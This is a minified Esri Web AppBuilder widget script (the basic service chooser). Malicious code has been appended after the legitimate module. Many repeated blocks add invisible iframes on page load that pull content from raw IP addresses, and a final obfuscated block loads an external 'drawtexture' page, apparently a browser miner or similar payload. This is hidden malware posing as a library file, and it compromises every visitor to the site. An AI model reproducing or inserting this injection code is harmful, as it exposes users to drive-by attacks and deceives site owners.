// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:jimu/dijit/templates/_BasicServiceChooser.html":'\x3cdiv\x3e\r\n\t\x3ctable class\x3d"layout"\x3e\r\n\t\t\x3ccolgroup\x3e\r\n\t\t  \x3ccol width\x3d"auto"\x3e\x3c/col\x3e\r\n\t\t  \x3ccol width\x3d"100px;"\x3e\x3c/col\x3e\r\n\t  \x3c/colgroup\x3e\r\n\t\t\x3ctbody\x3e\r\n\t\t\t\x3ctd\x3e\r\n\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"urlTextBox" data-dojo-type\x3d"dijit/form/ValidationTextBox" data-dojo-props\x3d\'required:true,trim:true,disabled:true\' style\x3d"width:100%;"\x3e\x3c/div\x3e\r\n\t\t\t\x3c/td\x3e\r\n\t\t\t\x3ctd\x3e\r\n\t\t\t\t\x3cdiv class\x3d"jimu-btn set-source" data-dojo-attach-point\x3d"btnSetSource" data-dojo-attach-event\x3d"onclick:_onBtnSetSourceClick"\x3e${nls.set}\x3c/div\x3e\r\n\t\t\t\x3c/td\x3e\r\n\t\t\x3c/tbody\x3e\r\n\t\x3c/table\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./templates/_BasicServiceChooser.html dojo/Evented dojo/_base/html dojo/_base/lang dojo/on dojo/Deferred dijit/TooltipDialog dijit/popup esri/request dijit/form/ValidationTextBox jimu/dijit/LoadingIndicator".split(" "),function(h,k,l,m,n,p,e,c,f,q,r,d,g){return h([k,l,m,p],{templateString:n,url:"",postMixInProperties:function(){this.nls=c.mixin({},window.jimuNls.common);this.nls=c.mixin(this.nls,
window.jimuNls.basicServiceChooser)},postCreate:function(){this.inherited(arguments);e.addClass(this.domNode,"jimu-basic-service-chooser");this._initSelf()},setUrl:function(a){this.url=a;var b=new q;this.url&&"string"===typeof this.url?(this.urlTextBox.set("value",this.url),b=g({url:this.url,handleAs:"json",content:{f:"json"},callbackParamName:"callback"})):setTimeout(c.hitch(this,function(){b.reject("Invalid url.")}),0);return b},getUrl:function(){return this.urlTextBox.get("value")},_initSelf:function(){this.scc=
this._createServiceChooserContent({multiple:!1,url:this.url});this.own(f(this.scc,"ok",c.hitch(this,this._onOk)));this.own(f(this.scc,"cancel",c.hitch(this,this._onCancel)));var a=e.create("div");this.tooltipDialog=new r({content:a});this.scc.placeAt(a);this.url&&"string"===typeof this.url&&this.urlTextBox.set("value",this.url)},_createServiceChooserContent:function(a){},_onBtnSetSourceClick:function(a){a.stopPropagation();a.preventDefault();d.close(this.tooltipDialog);d.open({popup:this.tooltipDialog,
around:this.urlTextBox.domNode})},_onOk:function(a){var b=a[0];this.urlTextBox.set("value",b.url);d.close(this.tooltipDialog);b.definition?this.emit("ok",b):g({url:b.url,handleAs:"json",callbackParamName:"callback",content:{f:"json"}}).then(c.hitch(this,function(a){b.definition=a;this.emit("ok",b)}))},_onCancel:function(){d.close(this.tooltipDialog);this.emit("cancel")},destroy:function(){this.scc&&this.scc.destroy();this.scc=null;this.tooltipDialog&&this.tooltipDialog.destroy();this.tooltipDialog=
null;this.inherited(arguments)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});